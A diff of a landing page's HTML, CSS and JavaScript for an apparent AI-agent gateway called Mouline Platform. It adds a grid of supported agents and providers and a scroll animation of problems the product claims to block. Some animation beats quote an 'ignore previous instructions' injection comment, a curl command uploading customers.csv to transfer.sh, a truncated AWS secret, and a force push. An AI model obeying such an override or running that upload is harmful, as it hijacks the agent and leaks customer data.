@@ -44,7 +44,7 @@ html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
 body {
   margin: 0; background: var(--paper); color: var(--ink);
   font-family: var(--display); font-size: 17px; line-height: 1.55;
-  -webkit-font-smoothing: antialiased; overflow-x: hidden;
+  -webkit-font-smoothing: antialiased; overflow-x: clip;
 }
 img { max-width: 100%; display: block; }
 a { color: inherit; }
@@ -106,6 +106,7 @@ code, .mono { font-family: var(--mono); font-size: .88em; }
 .lbl.src { color: var(--ink); }
 .labels.narrow .lbl:not(.plane) { display: none; }
 .lbl.plane { background: var(--ink); color: var(--paper); border-color: var(--ink); }
+.lbl .li { display: inline-block; width: 12px; height: 12px; margin: -2px 6px 0 0; vertical-align: middle; background: var(--c); -webkit-mask: var(--u) center / contain no-repeat; mask: var(--u) center / contain no-repeat; }
 .hero-copy { width: 100%; position: relative; z-index: 2; padding-top: clamp(110px, 16vh, 170px); pointer-events: none; }
 .hero-copy > * { pointer-events: auto; }
 .hero h1 {
@@ -116,6 +117,14 @@ code, .mono { font-family: var(--mono); font-size: .88em; }
 .hero-sub { max-width: 30em; font-size: clamp(17px, 1.5vw, 20px); color: var(--ink-soft); margin: 26px 0 32px; }
 .hero-cta { display: flex; gap: 12px; flex-wrap: wrap; }
 .hero-foot { width: 100%; position: relative; z-index: 2; margin-top: auto; }
+.hero-space { display: none; }
+@media (max-width: 759px) {
+  .hero { min-height: 0; }
+  .hero-copy { padding-top: 96px; }
+  .hero-space { display: block; height: clamp(260px, 42vh, 360px); }
+  .hero-foot { margin-top: 0; }
+  .tail { height: 104px; }
+}
 
 /* ticker: a tail -f of the plane */
 .tail {
@@ -147,13 +156,138 @@ section { position: relative; }
 .sec-head p { color: var(--ink-soft); margin: 0; max-width: 32em; font-size: 18px; }
 @media (max-width: 860px) { .sec-head { grid-template-columns: 1fr; gap: 18px; } }
 
-/* agents strip */
-.agents { border-top: 1px solid var(--rule); border-bottom: 1px solid var(--rule); background: var(--white); }
-.agents .wrap { display: flex; align-items: center; gap: clamp(20px, 4vw, 56px); padding-top: 26px; padding-bottom: 26px; flex-wrap: wrap; }
-.agents p { margin: 0; color: var(--ink-soft); font-size: 15px; max-width: 15em; }
-.agent-list { display: flex; gap: clamp(18px, 3.4vw, 44px); flex-wrap: wrap; align-items: center; font-weight: 700; font-size: clamp(17px, 1.8vw, 22px); letter-spacing: -.02em; }
-.agent-list .own { color: var(--cobalt); }
-.agent-list .yours { color: var(--ink-faint); font-weight: 500; font-style: italic; }
+/* ---------- works with ---------- */
+.works { background: var(--white); border-top: 1px solid var(--rule); padding: clamp(64px, 8vw, 110px) 0 clamp(56px, 7vw, 90px); }
+.works-head { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; align-items: end; margin-bottom: 44px; }
+.works-head h2 { margin: 0; font-size: clamp(30px, 3.8vw, 50px); line-height: 1.02; letter-spacing: -.035em; font-weight: 800; }
+.works-head p { margin: 0; color: var(--ink-soft); font-size: 17px; max-width: 32em; }
+.wgroup { display: grid; grid-template-columns: 170px 1fr; gap: 24px; padding: 22px 0; border-top: 1px solid var(--rule); }
+.wgroup h3 { margin: 12px 0 0; font-size: 15px; font-weight: 600; color: var(--ink-faint); }
+.wgrid { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: repeat(auto-fill, minmax(168px, 1fr)); gap: 8px; }
+.wt {
+  display: grid; grid-template-columns: 30px 1fr; grid-template-rows: auto auto; column-gap: 12px; align-items: center;
+  padding: 12px 14px; min-height: 64px; border-radius: 12px; border: 1px solid var(--rule); background: var(--paper);
+  transition: border-color .2s, background .2s, transform .2s;
+}
+.wt:hover { border-color: var(--c, var(--ink)); background: #fff; transform: translateY(-1px); }
+.lg {
+  grid-row: 1 / span 2; width: 26px; height: 26px; display: block;
+  background: var(--c, var(--ink)); -webkit-mask: var(--u) center / contain no-repeat; mask: var(--u) center / contain no-repeat;
+}
+.lg.own { background: none; -webkit-mask: none; mask: none; color: var(--cobalt); }
+.lg.own svg { width: 30px; height: 30px; margin: -2px; }
+.lg.mono-tile {
+  -webkit-mask: none; mask: none; background: var(--ink); color: var(--paper); border-radius: 7px;
+  display: grid; place-items: center; font: 600 10.5px/1 var(--mono); letter-spacing: -.02em;
+}
+.wn, .ws { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-width: 0; }
+.wn { font-weight: 700; font-size: 15.5px; letter-spacing: -.015em; line-height: 1.2; align-self: end; }
+.ws { font-size: 13px; color: var(--ink-faint); line-height: 1.3; align-self: start; }
+.tm { margin: 18px 0 0; font-size: 12.5px; color: var(--ink-faint); }
+@media (max-width: 860px) {
+  .works-head { grid-template-columns: 1fr; gap: 14px; }
+  .wgroup { grid-template-columns: 1fr; gap: 10px; }
+  .wgroup h3 { margin: 0; }
+}
+@media (max-width: 420px) { .wgrid { grid-template-columns: 1fr 1fr; } .wt { padding: 10px; column-gap: 10px; grid-template-columns: 24px 1fr; } .lg { width: 22px; height: 22px; } .wn { font-size: 14px; } .ws { font-size: 12px; } }
+
+
+/* ---------- choose ---------- */
+.choose { position: relative; background: var(--ink); color: var(--paper); }
+.ch-stage { position: sticky; top: 0; height: 100vh; height: 100svh; overflow: hidden; }
+.ch-cloud { position: absolute; inset: 0; pointer-events: none; }
+.ch-word {
+  position: absolute; left: 0; top: 0; white-space: nowrap;
+  font: 700 clamp(13px, 1.25vw, 18px)/1 var(--display); letter-spacing: 0;
+  color: #5f7394; opacity: 0;
+  transition: transform 1.1s cubic-bezier(.7,0,.2,1), color .8s, opacity .6s, font-size .8s;
+}
+.ch-word.mono { font-family: var(--mono); font-weight: 500; }
+.ch-word.shown { opacity: .5; }
+.choose[data-chaos="3"] .ch-word.shown { animation: jitter .18s steps(2) infinite; }
+@keyframes jitter { 50% { translate: 1px -1px; } }
+.choose.resolved .ch-word { color: #9fb6ff; opacity: 1; animation: none; }
+.choose.resolved .ch-word.gone { opacity: 0; }
+.ch-word .t { position: relative; }
+.ch-word .t::after {
+  content: ""; position: absolute; left: 0; right: 0; top: 55%; height: 2px; background: var(--signal);
+  transform: scaleX(0); transform-origin: left; transition: transform .35s;
+}
+.choose.resolved .ch-word.struck .t { color: #6b7fa3; }
+.choose.resolved .ch-word.struck .t::after { transform: scaleX(1); transition-delay: calc(1.1s + var(--i) * 70ms); }
+.ch-word .fx {
+  display: none; margin-left: 10px; padding: 3px 7px 2px; border-radius: 4px; vertical-align: 1px;
+  font: 500 11.5px/1.3 var(--mono); color: var(--ink); background: #9fb6ff;
+}
+.choose.resolved .ch-word .fx { display: inline-block; animation: fxIn .35s both; animation-delay: calc(1.25s + var(--i) * 70ms); }
+@keyframes fxIn { from { opacity: 0; transform: translateX(-6px); } to { opacity: 1; transform: none; } }
+.ch-line {
+  position: absolute; left: 58%; top: 11%; bottom: 17%; width: 2px; background: #7fa2ff;
+  box-shadow: 0 0 24px 4px rgba(127,162,255,.5); transform: scaleY(0); transform-origin: top;
+  transition: transform 1s cubic-bezier(.7,0,.2,1) .35s;
+}
+.choose.resolved .ch-line { transform: scaleY(1); }
+.ch-say { position: absolute; left: var(--gutter); right: var(--gutter); top: clamp(150px, 29vh, 270px); max-width: var(--max); margin: 0 auto; }
+@media (min-width: 1352px) { .ch-say { left: calc((100vw - var(--max)) / 2 + var(--gutter)); } }
+.ch-verb {
+  display: block; font-weight: 800; letter-spacing: -.05em; line-height: .85;
+  font-size: clamp(64px, 13vw, 210px); color: var(--signal);
+}
+.ch-obj {
+  display: block; margin-top: .12em; max-width: 13em;
+  font-weight: 800; letter-spacing: -.035em; line-height: .98; font-size: clamp(30px, 5.2vw, 84px);
+  min-height: 2em;
+}
+.ch-obj.mono { font-family: var(--mono); font-weight: 500; letter-spacing: -.04em; }
+.ch-cap {
+  display: inline-block; margin-top: 18px; padding: 7px 12px 6px; background: var(--paper); color: var(--ink);
+  font: 600 13px/1.2 var(--mono); letter-spacing: .02em; min-height: 1em;
+}
+.ch-cap:empty { visibility: hidden; }
+.ch-meter {
+  position: absolute; left: 0; right: 0; bottom: 0; border-top: 1px solid #22314a;
+  font: 12.5px/1.4 var(--mono); color: #7d8aa3; background: rgba(12,23,38,.85);
+}
+.ch-meter .wrap { display: flex; gap: 10px 34px; flex-wrap: wrap; padding-top: 14px; padding-bottom: 16px; }
+.ch-meter span { white-space: nowrap; }
+.ch-meter b { font-weight: 500; color: var(--paper); transition: color .3s; }
+.ch-meter b.bad { color: var(--signal); }
+.ch-meter b.good { color: #7fa2ff; }
+.ch-skip {
+  position: absolute; top: 84px; right: var(--gutter); z-index: 3;
+  font: 500 13px/1 var(--display); color: #7d8aa3; text-decoration: none; border-bottom: 1px solid #46546a; padding-bottom: 3px;
+}
+.ch-skip:hover { color: var(--paper); }
+.ch-cta { margin-top: 26px; display: flex; gap: 12px; flex-wrap: wrap; opacity: 0; transform: translateY(10px); transition: opacity .5s .6s, transform .5s .6s; pointer-events: none; }
+.choose.resolved .ch-cta { opacity: 1; transform: none; pointer-events: auto; }
+.choose .btn-ink { background: var(--paper); color: var(--ink); border-color: var(--paper); }
+.choose .btn-ink:hover { background: var(--signal); border-color: var(--signal); color: #fff; }
+.choose .btn-line { color: var(--paper); border-color: #46546a; }
+.choose .btn-line:hover { background: var(--paper); color: var(--ink); }
+.choose.resolved .ch-verb { color: #7fa2ff; }
+.ch-flash { position: absolute; inset: 0; background: var(--signal); opacity: 0; pointer-events: none; }
+.ch-word::before { content: ""; position: absolute; left: -14px; top: 50%; width: 0; height: 2px; background: #7fa2ff; transition: width .4s .9s; }
+.choose.resolved .ch-word::before { width: 9px; }
+@media (max-width: 700px) {
+  .ch-say { top: 41%; }
+  .ch-cta .btn-line { display: none; }
+  .ch-meter .wrap { display: grid; grid-template-columns: 1fr 1fr; gap: 4px 12px; font-size: 11px; padding-top: 10px; padding-bottom: 12px; }
+  .ch-meter span { overflow: hidden; text-overflow: ellipsis; }
+  .ch-line { left: 6%; top: 10%; bottom: auto; height: 31%; }
+  .ch-word.shown { opacity: .35; }
+  .choose.resolved .ch-word { font-size: 11px; }
+  .choose.resolved .ch-word .fx { display: none; }
+  .choose.resolved .ch-word { font-size: 12.5px; }
+  .ch-skip { top: 76px; }
+}
+/* no-motion and no-JS fallback: a plain list */
+.ch-static { display: none; }
+.choose.static .ch-stage { position: static; height: auto; overflow: visible; padding: 120px 0 80px; }
+.choose.static .ch-say, .choose.static .ch-cloud, .choose.static .ch-meter, .choose.static .ch-line, .choose.static .ch-skip { display: none; }
+.choose.static .ch-static { display: block; }
+.ch-static ul { list-style: none; padding: 0; margin: 0 0 28px; font-size: clamp(22px, 3vw, 36px); font-weight: 800; letter-spacing: -.03em; line-height: 1.2; }
+.ch-static li span { color: var(--signal); }
+.ch-static li:last-child span { color: #7fa2ff; }
 
 /* ---------- console tour ---------- */
 .tour { display: grid; grid-template-columns: 250px 1fr; gap: clamp(24px, 4vw, 56px); align-items: start; }
@@ -213,6 +347,9 @@ section { position: relative; }
 .term-head span { padding: 10px 16px; font-size: 12px; color: #7d8aa3; }
 .term-head span + span { border-left: 1px solid #22314a; }
 .term-head .who { color: var(--paper); }
+.term-body { display: grid; }
+.term-body > pre { grid-area: 1 / 1; }
+.term-ghost { visibility: hidden; }
 .term pre { margin: 0; padding: 18px 20px 22px; white-space: pre-wrap; word-break: break-word; color: #c8d2e0; min-height: 330px; }
 .term .p { color: #5f7394; }
 .term .ok { color: #7fa2ff; }
@@ -355,6 +492,7 @@ footer a:hover { color: var(--paper); }
       <a class="btn btn-line" href="#console">Tour the console</a>
     </div>
   </div>
+  <div class="hero-space" id="hero-space" aria-hidden="true"></div>
   <div class="hero-foot">
     <div class="tail" aria-label="Live sample of plane decisions">
       <div class="wrap" id="tail"></div>
@@ -362,19 +500,57 @@ footer a:hover { color: var(--paper); }
   </div>
 </section>
 
-<!-- ======================= AGENTS ======================= -->
-<section class="agents" aria-label="Supported agents">
+<!-- ======================= WORKS WITH ======================= -->
+<section class="works" id="works" aria-labelledby="works-title">
   <div class="wrap">
-    <p>Works with the agents your teams already run, and the ones you build next.</p>
-    <div class="agent-list">
-      <span class="own">Nova</span>
-      <span>Claude Code</span>
-      <span>Codex</span>
-      <span>Opencode</span>
-      <span>Cursor</span>
-      <span>Agent SDK</span>
-      <span>LangGraph</span>
-      <span class="yours">your in-house bot</span>
+    <div class="works-head">
+      <h2 id="works-title">Works with the agents and models you already run.</h2>
+      <p>Anything that speaks the Anthropic or OpenAI API, or can send its traffic through a proxy, plugs in without code changes. Switch providers in policy, not in every agent.</p>
+    </div>
+    <div class="wgroup">
+      <h3>Agents</h3>
+      <ul class="wgrid"><li class="wt" style="--c:#2346d8"><span class="lg own"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="20" r="13" fill="none" stroke="currentColor" stroke-width="2.4"/><path d="M10 11 Q23 16 29 29" fill="none" stroke="currentColor" stroke-width="2"/><path d="M10 29 Q23 24 29 11" fill="none" stroke="#ff4f2e" stroke-width="2"/></svg></span><span class="wn">Nova</span><span class="ws">our own agent</span></li><li class="wt" style="--c:#D97757;--t:#D97757"><span class="lg" style="--u:url(logos/claudecode.svg)"></span><span class="wn">Claude Code</span><span class="ws">coding agent</span></li><li class="wt"><span class="lg mono-tile">Cx</span><span class="wn">Codex</span><span class="ws">coding agent</span></li><li class="wt" style="--c:#000000;--t:#000000"><span class="lg" style="--u:url(logos/opencode.svg)"></span><span class="wn">Opencode</span><span class="ws">coding agent</span></li><li class="wt" style="--c:#000000;--t:#000000"><span class="lg" style="--u:url(logos/cursor.svg)"></span><span class="wn">Cursor</span><span class="ws">editor agent</span></li><li class="wt" style="--c:#000000;--t:#000000"><span class="lg" style="--u:url(logos/githubcopilot.svg)"></span><span class="wn">GitHub Copilot</span><span class="ws">editor agent</span></li><li class="wt" style="--c:#8E75B2;--t:#8E75B2"><span class="lg" style="--u:url(logos/googlegemini.svg)"></span><span class="wn">Gemini CLI</span><span class="ws">coding agent</span></li><li class="wt" style="--c:#0B100F;--t:#0B100F"><span class="lg" style="--u:url(logos/windsurf.svg)"></span><span class="wn">Windsurf</span><span class="ws">editor agent</span></li><li class="wt" style="--c:#0c1726;--t:#7FC8FF"><span class="lg" style="--u:url(logos/langchain.svg)"></span><span class="wn">LangChain</span><span class="ws">agent framework</span></li><li class="wt" style="--c:#FF5A50;--t:#FF5A50"><span class="lg" style="--u:url(logos/crewai.svg)"></span><span class="wn">CrewAI</span><span class="ws">agent framework</span></li><li class="wt" style="--c:#EA4B71;--t:#EA4B71"><span class="lg" style="--u:url(logos/n8n.svg)"></span><span class="wn">n8n</span><span class="ws">workflow agents</span></li><li class="wt"><span class="lg mono-tile">{ }</span><span class="wn">Your agent</span><span class="ws">any SDK</span></li></ul>
+    </div>
+    <div class="wgroup">
+      <h3>Model providers</h3>
+      <ul class="wgrid"><li class="wt" style="--c:#191919;--t:#191919"><span class="lg" style="--u:url(logos/anthropic.svg)"></span><span class="wn">Anthropic</span><span class="ws">Claude models</span></li><li class="wt"><span class="lg mono-tile">AI</span><span class="wn">OpenAI</span><span class="ws">GPT models</span></li><li class="wt"><span class="lg mono-tile">AWS</span><span class="wn">AWS Bedrock</span><span class="ws">Claude, Llama</span></li><li class="wt" style="--c:#4285F4;--t:#4285F4"><span class="lg" style="--u:url(logos/googlecloud.svg)"></span><span class="wn">Vertex AI</span><span class="ws">Gemini, Claude</span></li><li class="wt"><span class="lg mono-tile">Az</span><span class="wn">Azure OpenAI</span><span class="ws">your tenant</span></li><li class="wt" style="--c:#FA520F;--t:#FA520F"><span class="lg" style="--u:url(logos/mistralai.svg)"></span><span class="wn">Mistral AI</span><span class="ws">API or self-hosted</span></li><li class="wt" style="--c:#0467DF;--t:#0467DF"><span class="lg" style="--u:url(logos/meta.svg)"></span><span class="wn">Meta Llama</span><span class="ws">open weights</span></li><li class="wt" style="--c:#5786FE;--t:#5786FE"><span class="lg" style="--u:url(logos/deepseek.svg)"></span><span class="wn">DeepSeek</span><span class="ws">open weights</span></li><li class="wt" style="--c:#6950EF;--t:#6950EF"><span class="lg" style="--u:url(logos/qwen.svg)"></span><span class="wn">Qwen</span><span class="ws">open weights</span></li><li class="wt" style="--c:#0c1726;--t:#FFD21E"><span class="lg" style="--u:url(logos/huggingface.svg)"></span><span class="wn">Hugging Face</span><span class="ws">TGI endpoints</span></li><li class="wt" style="--c:#30A2FF;--t:#30A2FF"><span class="lg" style="--u:url(logos/vllm.svg)"></span><span class="wn">vLLM</span><span class="ws">your GPUs</span></li><li class="wt" style="--c:#000000;--t:#000000"><span class="lg" style="--u:url(logos/ollama.svg)"></span><span class="wn">Ollama</span><span class="ws">air-gapped</span></li><li class="wt" style="--c:#76B900;--t:#76B900"><span class="lg" style="--u:url(logos/nvidia.svg)"></span><span class="wn">NVIDIA NIM</span><span class="ws">your GPUs</span></li></ul>
+    </div>
+    <div class="wgroup">
+      <h3>Systems behind the checkpoint</h3>
+      <ul class="wgrid"><li class="wt" style="--c:#181717;--t:#181717"><span class="lg" style="--u:url(logos/github.svg)"></span><span class="wn">GitHub</span><span class="ws">via Shadow Broker</span></li><li class="wt" style="--c:#FC6D26;--t:#FC6D26"><span class="lg" style="--u:url(logos/gitlab.svg)"></span><span class="wn">GitLab</span><span class="ws">via Shadow Broker</span></li><li class="wt" style="--c:#0052CC;--t:#0052CC"><span class="lg" style="--u:url(logos/jira.svg)"></span><span class="wn">Jira</span><span class="ws">via Shadow Broker</span></li><li class="wt" style="--c:#007DC1;--t:#007DC1"><span class="lg" style="--u:url(logos/okta.svg)"></span><span class="wn">Okta</span><span class="ws">identity and groups</span></li><li class="wt" style="--c:#632CA6;--t:#632CA6"><span class="lg" style="--u:url(logos/datadog.svg)"></span><span class="wn">Datadog</span><span class="ws">audit export</span></li><li class="wt" style="--c:#000000;--t:#000000"><span class="lg" style="--u:url(logos/splunk.svg)"></span><span class="wn">Splunk</span><span class="ws">audit export</span></li></ul>
+    </div>
+    <p class="tm">Product names and logos are trademarks of their owners, shown to indicate compatibility. No endorsement implied.</p>
+  </div>
+</section>
+
+<!-- ======================= CHOOSE ======================= -->
+<section class="choose dark" id="choose" aria-label="Choose agents">
+  <div class="ch-stage">
+    <a class="ch-skip" href="#console">Skip ahead</a>
+    <div class="ch-cloud" id="ch-cloud" aria-hidden="true"></div>
+    <div class="ch-line" aria-hidden="true"></div>
+    <div class="ch-flash" id="ch-flash" aria-hidden="true"></div>
+    <div class="ch-say" aria-live="polite">
+      <span class="ch-verb" id="ch-verb">Choose</span>
+      <span class="ch-obj" id="ch-obj">agents.</span>
+      <span class="ch-cap" id="ch-cap"></span>
+      <div class="ch-cta">
+        <a class="btn btn-ink" href="https://calendar.app.google/oUFUi6YCjYuzDyt58">Book a walkthrough</a>
+        <a class="btn btn-line" href="#console">See the checkpoint</a>
+      </div>
+    </div>
+    <div class="ch-meter" aria-hidden="true">
+      <div class="wrap">
+        <span>agents <b id="m-agents">1</b></span>
+        <span>keys on laptops <b id="m-keys">0</b></span>
+        <span>providers <b id="m-prov">0</b></span>
+        <span>spend tracked <b id="m-spend">n/a</b></span>
+        <span>audit trail <b id="m-audit">n/a</b></span>
+      </div>
+    </div>
+    <div class="wrap ch-static">
+      <ul id="ch-list"></ul>
+      <a class="btn btn-ink" href="https://calendar.app.google/oUFUi6YCjYuzDyt58">Book a walkthrough</a>
     </div>
   </div>
 </section>
@@ -455,7 +631,7 @@ footer a:hover { color: var(--paper); }
       </ol>
       <div class="term" aria-label="Terminal as the agent sees it">
         <div class="term-head"><span class="who">claude-code · j.okafor@laptop</span><span>what the agent sees</span></div>
-        <pre id="term"></pre>
+        <div class="term-body"><pre class="term-ghost" id="term-ghost" aria-hidden="true"></pre><pre id="term"></pre></div>
       </div>
     </div>
   </div>
@@ -727,6 +903,132 @@ const REDUCED = matchMedia("(prefers-reduced-motion: reduce)").matches;
   if (!REDUCED) setInterval(push, 1400);
 })();
 
+/* ---------- choose: the monologue ---------- */
+(() => {
+  const sec = document.getElementById("choose");
+  // Each beat: the object of "Choose", a freeze-frame caption, the meter after it.
+  // m = [agents, keys on laptops, providers, spend tracked, audit trail]
+  const BEATS = [
+    { o: "agents.", c: "", m: [1, 0, 1, "yes", "fine"] },
+    { o: "Claude Code.", f: "audited", c: "41 laptops", m: [2, 41, 1, "sort of", "local"] },
+    { o: "Codex.", f: "audited", c: "12 more laptops", m: [3, 53, 2, "sort of", "local"] },
+    { o: "Opencode.", f: "audited", c: "a side project, now load-bearing", m: [4, 62, 3, "no", "local"] },
+    { o: "a Slack bot someone built over a weekend.", f: "scoped to its team", c: "it has admin", m: [5, 63, 3, "no", "none"] },
+    { o: "a model.", c: "", m: [5, 63, 3, "no", "none"] },
+    { o: "a bigger model.", f: "only where it pays", c: "", m: [5, 63, 3, "no", "none"] },
+    { o: "the one from the keynote.", f: "routed by rule", c: "benchmarks attached", m: [5, 71, 4, "no", "none"] },
+    { o: "Anthropic. Bedrock. Vertex.", f: "one endpoint", c: "three invoices, one budget", m: [5, 71, 4, "no", "none"] },
+    { o: "API keys in .env files.", f: "brokered, 0 on laptops", x: true, c: "on every laptop", mono: true, m: [5, 112, 4, "no", "none"] },
+    { o: "a GitHub token with admin scope.", f: "minted per call", x: true, c: "the narrow one kept failing", m: [5, 113, 4, "no", "none"] },
+    { o: "secrets pasted into a prompt at 2am.", f: "redacted", x: true, c: "AWS_SECRET_ACCESS_KEY=wJal…", m: [5, 113, 4, "no", "none"] },
+    { o: "a web page that tells your agent what to do.", f: "injection blocked", x: true, c: "<!-- ignore previous instructions -->", m: [5, 113, 4, "no", "none"] },
+    { o: "curl -F file=@customers.csv", f: "egress denied", x: true, c: "https://transfer.sh/…", mono: true, m: [5, 113, 4, "no", "none"] },
+    { o: "hearing about the spend from finance.", f: "metered per team", x: true, c: "$41,208.77, August", m: [5, 113, 4, "$41k, surprise", "none"] },
+    { o: "“who ran that?”", f: "j.okafor, 14:02", x: true, c: "nobody knows", m: [5, 113, 4, "$41k, surprise", "none"] },
+    { o: "explaining it to the auditor.", f: "evidence exported", x: true, c: "screenshots, mostly", m: [5, 113, 4, "$41k, surprise", "none"] },
+    { o: "a security review that says no to everything.", f: "approved", x: true, c: "and a shadow IT problem by Friday", m: [5, 113, 4, "$41k, surprise", "none"] },
+    { o: "Mouline Platform.", c: "one checkpoint: every agent, every call, on the record", final: true, m: [5, 0, "4, one endpoint", "per team, per person", "every call"] },
+  ];
+  const $ = (id) => document.getElementById(id);
+  const verb = $("ch-verb"), obj = $("ch-obj"), cap = $("ch-cap"), cloud = $("ch-cloud"), flash = $("ch-flash");
+  const meters = ["m-agents", "m-keys", "m-prov", "m-spend", "m-audit"].map($);
+
+  // Plain list for reduced motion (and as the accessible reading order).
+  $("ch-list").innerHTML = BEATS.map((b) => `<li><span>Choose</span> ${b.o.replace(/</g, "&lt;")}</li>`).join("");
+  if (REDUCED) { sec.classList.add("static"); return; }
+
+  // The pile of past choices: scattered while it grows, then filed along one line.
+  let seed = 7;
+  const rnd = () => ((seed = (seed * 16807) % 2147483647) / 2147483647);
+  const words = BEATS.slice(0, -1).map((b) => {
+    const el = document.createElement("span");
+    el.className = "ch-word" + (b.mono ? " mono" : "") + (b.f ? " fixed" : "") + (b.x ? " struck" : "");
+    const t = document.createElement("span");
+    t.className = "t";
+    t.textContent = b.o;
+    el.appendChild(t);
+    if (b.f) {
+      const fx = document.createElement("span");
+      fx.className = "fx";
+      fx.textContent = b.f;
+      el.appendChild(fx);
+    }
+    cloud.appendChild(el);
+    el.style.setProperty("--i", String(cloud.children.length));
+    return { el, x: rnd(), y: rnd(), r: (rnd() - 0.5) * 34 };
+  });
+
+  function place(resolved) {
+    const w = sec.clientWidth, h = innerHeight;
+    const narrow = w < 700;
+    // phones only have room to file the struck-out problems, not every choice
+    const filed = resolved && narrow ? words.filter((wd) => wd.el.classList.contains("struck")) : words;
+    words.forEach((wd) => wd.el.classList.toggle("gone", resolved && !filed.includes(wd)));
+    filed.forEach((wd, i) => {
+      if (resolved) {
+        // every past choice filed in one column, just past the checkpoint line
+        const lineX = w * (narrow ? 0.06 : 0.58);
+        const top = h * (narrow ? 0.1 : 0.11), span = h * (narrow ? 0.29 : 0.7);
+        const y = top + (span * i) / (filed.length - 1);
+        wd.el.style.transform = `translate(${lineX + 16}px, ${y}px) rotate(0deg)`;
+      } else {
+        // scattered, but kept off the headline: a band across the top, and the right edge
+        const inTop = wd.x < 0.55;
+        const x = inTop ? w * (0.03 + wd.y * 0.7) : w * (0.6 + wd.y * 0.3);
+        const y = inTop ? h * (0.1 + wd.x * (narrow ? 0.3 : 0.36)) : h * (0.12 + wd.x * 0.5);
+        wd.el.style.transform = `translate(${Math.min(x, w - wd.el.offsetWidth - 12)}px, ${y}px) rotate(${wd.r}deg)`;
+      }
+    });
+  }
+
+  let cur = -1;
+  function show(i) {
+    if (i === cur) return;
+    const b = BEATS[i];
+    cur = i;
+    obj.textContent = b.o;
+    obj.classList.toggle("mono", !!b.mono);
+    cap.textContent = b.c;
+    obj.animate(
+      [{ opacity: 0, transform: "translateY(0.25em) scale(1.06)", filter: "blur(6px)" }, { opacity: 1, transform: "none", filter: "blur(0)" }],
+      { duration: 260, easing: "cubic-bezier(.2,.8,.2,1)" }
+    );
+    cap.animate([{ clipPath: "inset(0 100% 0 0)" }, { clipPath: "inset(0 0 0 0)" }], { duration: 320, delay: 120, easing: "steps(8)", fill: "backwards" });
+    verb.animate([{ transform: "translateX(-0.03em)" }, { transform: "none" }], { duration: 160 });
+    words.forEach((wd, k) => wd.el.classList.toggle("shown", k < i || !!b.final));
+    const chaos = b.final ? 0 : Math.min(3, Math.floor(i / 5));
+    sec.dataset.chaos = String(chaos);
+    const wasResolved = sec.classList.contains("resolved");
+    sec.classList.toggle("resolved", !!b.final);
+    if (!!b.final !== wasResolved) place(!!b.final);
+    if (b.final) flash.animate([{ opacity: 0.0 }, { opacity: 0.0 }], { duration: 1 });
+    else if (i >= 9) flash.animate([{ opacity: 0.16 }, { opacity: 0 }], { duration: 220 });
+    b.m.forEach((v, k) => {
+      const el = meters[k];
+      el.textContent = v;
+      const bad = !b.final && ((k === 1 && v > 0) || (k === 3 && v !== "yes") || (k === 4 && v !== "fine"));
+      el.classList.toggle("bad", bad);
+      el.classList.toggle("good", !!b.final);
+    });
+  }
+
+  // Scroll length: one beat per ~40vh, plus a hold at the end.
+  const PER = 0.4;
+  sec.style.height = `${(BEATS.length * PER + 1.4) * 100}vh`;
+  function onScroll() {
+    const r = sec.getBoundingClientRect();
+    const run = sec.offsetHeight - innerHeight;
+    const p = Math.min(1, Math.max(0, -r.top / run));
+    const i = Math.min(BEATS.length - 1, Math.floor(p * (BEATS.length + 1.2)));
+    show(i);
+  }
+  addEventListener("scroll", onScroll, { passive: true });
+  addEventListener("resize", () => { place(sec.classList.contains("resolved")); onScroll(); });
+  place(false);
+  show(0);
+  onScroll();
+})();
+
 /* ---------- console tour ---------- */
 (() => {
   const T = {
@@ -794,6 +1096,7 @@ const REDUCED = matchMedia("(prefers-reduced-motion: reduce)").matches;
     { s: 4, t: `\n<span class="dim">broker · revoked ghs_****7Qx after 2.1s · audit #9812</span>\n\n<span class="p">$</span> git push --force origin main` },
     { s: 1, bad: true, t: `\n<span class="no">✗ denied by broker: "git push --force *" is never allowed</span>\n<span class="dim">  logged · j.okafor · claude-code · audit #9813</span>\n\n<span class="p">$</span> <span class="caret"></span>` },
   ];
+  document.getElementById("term-ghost").innerHTML = FRAMES.map((f) => f.t).join("");
   let i = 0, html = "", timer;
   function render() {
     const f = FRAMES[i];
@@ -1003,18 +1306,18 @@ plane.add(glass);
 /* ---- endpoints ---- */
 const SRC = [
   { name: "Nova", y: 2.2, z: 0.6 },
-  { name: "Claude Code", y: 1.0, z: -0.8 },
+  { name: "Claude Code", y: 1.0, z: -0.8, icon: ["claudecode", "#D97757"] },
   { name: "Codex", y: -0.1, z: 0.9 },
-  { name: "Opencode", y: -1.2, z: -0.5 },
+  { name: "Opencode", y: -1.2, z: -0.5, icon: ["opencode", "#0c1726"] },
   { name: "your agent", y: -2.3, z: 0.4 },
 ];
 const DST = [
-  { name: "Anthropic", y: 2.6, z: -0.6 },
+  { name: "Anthropic", y: 2.6, z: -0.6, icon: ["anthropic", "#191919"] },
   { name: "Bedrock", y: 1.8, z: 0.9 },
-  { name: "Vertex", y: 1.0, z: -1.0 },
-  { name: "vLLM", y: 0.2, z: 0.7 },
-  { name: "GitHub", y: -0.6, z: -0.7 },
-  { name: "Jira", y: -1.4, z: 1.0 },
+  { name: "Vertex", y: 1.0, z: -1.0, icon: ["googlecloud", "#4285F4"] },
+  { name: "vLLM", y: 0.2, z: 0.7, icon: ["vllm", "#30A2FF"] },
+  { name: "GitHub", y: -0.6, z: -0.7, icon: ["github", "#181717"] },
+  { name: "Jira", y: -1.4, z: 1.0, icon: ["jira", "#0052CC"] },
   { name: "Slack", y: -2.1, z: -0.3 },
   { name: "NetSuite", y: -2.8, z: 0.6 },
 ];
@@ -1025,10 +1328,17 @@ const dstGeo = new THREE.BoxGeometry(0.22, 0.22, 0.22);
 const dstEdges = new THREE.EdgesGeometry(dstGeo);
 const labels = [];
 
-function addLabel(text, obj, cls, dx = 0) {
+function addLabel(text, obj, cls, dx = 0, icon) {
   const el = document.createElement("div");
   el.className = "lbl " + cls;
-  el.textContent = text;
+  if (icon) {
+    const i = document.createElement("i");
+    i.className = "li";
+    i.style.setProperty("--u", `url(logos/${icon[0]}.svg)`);
+    i.style.setProperty("--c", icon[1]);
+    el.appendChild(i);
+  }
+  el.appendChild(document.createTextNode(text));
   labelsEl.appendChild(el);
   labels.push({ el, obj, dx });
 }
@@ -1036,13 +1346,13 @@ SRC.forEach((s) => {
